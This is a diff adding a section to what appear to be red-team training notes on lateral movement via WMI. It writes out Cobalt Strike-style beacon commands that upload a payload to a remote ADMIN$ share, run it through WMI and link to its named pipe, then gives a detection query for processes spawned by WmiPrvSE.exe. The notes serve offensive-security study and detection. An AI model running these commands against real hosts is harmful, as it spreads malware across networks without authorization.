@@ -46,4 +46,14 @@ Catch by looking for 4697 service created events (which are rare, unless a servi
 
 ## Windows Management Instrumentation (WMI)
 
-WMI is part of remote-exec. 
+WMI is part of remote-exec, which uses WMI's "process call create" to run a command on the target. Easiest way is to upload a payload to the target and run it via WMI. The process runs in an elevated context of the calling user.
+
+    beacon> cd \\web.dev.cyberbotic.io\ADMIN$
+    beacon> upload C:\Payloads\smb_x64.exe
+    beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
+    beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10  // connect to process
+
+To catch, look for process create events where WmiPrvSE is the parent: ```event.category: process and event.type: start and process.parent.name: WmiPrvSE.exe```
+
+
+
